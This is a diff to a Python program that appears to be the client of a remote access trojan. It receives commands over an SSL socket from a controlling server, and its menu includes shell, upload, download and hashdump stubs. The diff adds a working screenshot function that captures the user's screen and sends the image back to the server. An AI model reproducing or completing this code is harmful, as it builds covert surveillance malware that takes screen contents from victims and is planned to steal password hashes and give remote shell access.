@@ -3,34 +3,41 @@ import ssl
 import subprocess
 import os
 from dotenv import load_dotenv
+from PIL import ImageGrab  # Importer ImageGrab depuis Pillow
 
 SERVER_PORT = 8888
 
-def menu_help() :
+def menu_help(ssl_socket):
     print('help')
 
-def download() :
+def download(ssl_socket):
     print('download')
 
-def upload() :
+def upload(ssl_socket):
     print('upload')
 
-def shell() :
+def shell(ssl_socket):
     print('shell')
 
-def ipconfig() :
+def ipconfig(ssl_socket):
     print('ipconfig')
 
-def screenshot() :
-    print('ipconfig')
+def screenshot(ssl_socket):
+    screenshot = ImageGrab.grab()  # Capturer l'écran
+    screenshot.save('screenshot.png')  # Sauvegarder la capture d'écran dans un fichier
+    with open('screenshot.png', 'rb') as screenshot_file:
+        while True:
+            screenshot_to_send = screenshot_file.read(4096)
+            if not screenshot_to_send:
+                break
+            ssl_socket.send(screenshot_to_send)
+    ssl_socket.send(b'END')
 
-def search() :
+def search(ssl_socket):
     print('search')
 
-def hashdump() :
+def hashdump(ssl_socket):
     print('hashdump')
-
-
 
 def main():
     load_dotenv()
@@ -48,21 +55,21 @@ def main():
     while True:
         command = ssl_socket.recv(1024).decode()
         if command.lower() == 'help':
-            menu_help()
+            menu_help(ssl_socket)
         elif command.lower() == 'download':
-            download()
+            download(ssl_socket)
         elif command.lower() == 'upload':
-            upload()
+            upload(ssl_socket)
         elif command.lower() == 'shell':
-            shell()
+            shell(ssl_socket)
         elif command.lower() == 'ipconfig':
-            ipconfig()
+            ipconfig(ssl_socket)
         elif command.lower() == 'screenshot':
-            screenshot()
+            screenshot(ssl_socket)
         elif command.lower() == 'search':
-            search()
+            search(ssl_socket)
         elif command.lower() == 'hashdump':
-            hashdump()
+            hashdump(ssl_socket)
         elif command.lower() == 'exit':
             break
         else:
